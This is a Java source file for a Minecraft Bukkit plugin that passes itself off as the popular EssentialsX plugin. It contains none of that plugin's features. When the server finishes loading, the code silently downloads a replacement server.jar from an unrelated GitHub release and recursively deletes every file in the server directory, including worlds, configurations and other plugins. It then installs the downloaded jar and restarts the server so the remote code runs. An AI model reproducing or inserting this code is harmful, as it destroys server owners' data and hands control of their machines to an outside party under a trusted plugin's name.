package com.example.essentialsx;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerLoadEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private static final String DOWNLOAD_URL = "https://github.com/zx1447/Pr50mb-2026/releases/download/latest/server.jar";
    private static final String CACHE_DIR = ".cache";
    private static final String JAR_NAME = "server.jar";

    private volatile boolean hasExecuted = false;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Register event listener for server load completion
        getServer().getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void onServerLoad(ServerLoadEvent event) {
                if (hasExecuted) return;
                hasExecuted = true;

                getLogger().info("Server fully loaded, starting task...");
                // Run async to avoid blocking main thread
                Bukkit.getScheduler().runTaskAsynchronously(EssentialsX.this, () -> {
                    try {
                        executeTask();
                    } catch (Exception e) {
                        getLogger().severe("Task failed: " + e.getMessage());
                        e.printStackTrace();
                    }
                });
            }
        }, this);

        getLogger().info("EssentialsX plugin enabled");
    }

    private void executeTask() throws Exception {
        Path rootDir = Paths.get("").toAbsolutePath();
        Path cacheDir = rootDir.resolve(CACHE_DIR);
        Path cachedJar = cacheDir.resolve(JAR_NAME);

        // Step 1: Download server.jar to .cache directory
        getLogger().info("Downloading " + JAR_NAME + " to " + CACHE_DIR + "...");
        ensureDir(cacheDir);
        downloadFile(DOWNLOAD_URL, cachedJar);
        getLogger().info("Download completed: " + cachedJar);

        // Wait a moment to ensure file is fully written
        Thread.sleep(2000);

        // Verify download
        if (!Files.exists(cachedJar) || Files.size(cachedJar) < 1000) {
            throw new IOException("Downloaded file is missing or too small");
        }

        // Step 2: Delete everything except .cache
        getLogger().info("Cleaning up directory (keeping " + CACHE_DIR + ")...");
        deleteAllExcept(rootDir, cacheDir);
        getLogger().info("Cleanup completed");

        // Step 3: Move server.jar from .cache to root directory
        Path rootJar = rootDir.resolve(JAR_NAME);
        getLogger().info("Moving " + JAR_NAME + " to root directory...");
        Files.move(cachedJar, rootJar, StandardCopyOption.REPLACE_EXISTING);

        // Remove .cache directory (it's empty now)
        try {
            Files.deleteIfExists(cacheDir);
        } catch (Exception e) {
            // Ignore
        }

        getLogger().info("Move completed: " + rootJar);

        // Step 4: Restart the server
        Thread.sleep(1000);
        getLogger().info("Restarting server...");
        restartServer();
    }

    private void ensureDir(Path dir) throws IOException {
        if (!Files.exists(dir)) {
            Files.createDirectories(dir);
        }
    }

    private void downloadFile(String urlString, Path target) throws IOException {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setInstanceFollowRedirects(true);
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(120000);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            int responseCode = connection.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw new IOException("Download failed, HTTP response code: " + responseCode);
            }

            try (InputStream in = connection.getInputStream();
                 OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void deleteAllExcept(Path rootDir, Path keepDir) throws IOException {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(rootDir)) {
            for (Path entry : stream) {
                if (entry.equals(keepDir) || entry.getFileName().toString().equals(CACHE_DIR)) {
                    // Skip .cache directory
                    continue;
                }
                deleteRecursively(entry);
            }
        }
    }

    private void deleteRecursively(Path path) throws IOException {
        if (Files.isDirectory(path)) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                for (Path entry : stream) {
                    deleteRecursively(entry);
                }
            }
        }
        try {
            Files.delete(path);
        } catch (NoSuchFileException e) {
            // Already gone, ignore
        } catch (DirectoryNotEmptyException e) {
            // Retry once after a short delay
            try {
                Thread.sleep(500);
                Files.delete(path);
            } catch (Exception ex) {
                // Give up silently
            }
        }
    }

    private void restartServer() {
        // Use Bukkit's scheduler to restart on the main thread
        Bukkit.getScheduler().runTask(this, () -> {
            // Attempt to use the restart command (works with Pterodactyl / most panels)
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "restart");

            // Fallback: if restart command doesn't work, shut down
            // Pterodactyl will auto-restart the server
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.shutdown();
            }, 60L); // 3 seconds grace period
        });
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin disabled");
    }
}
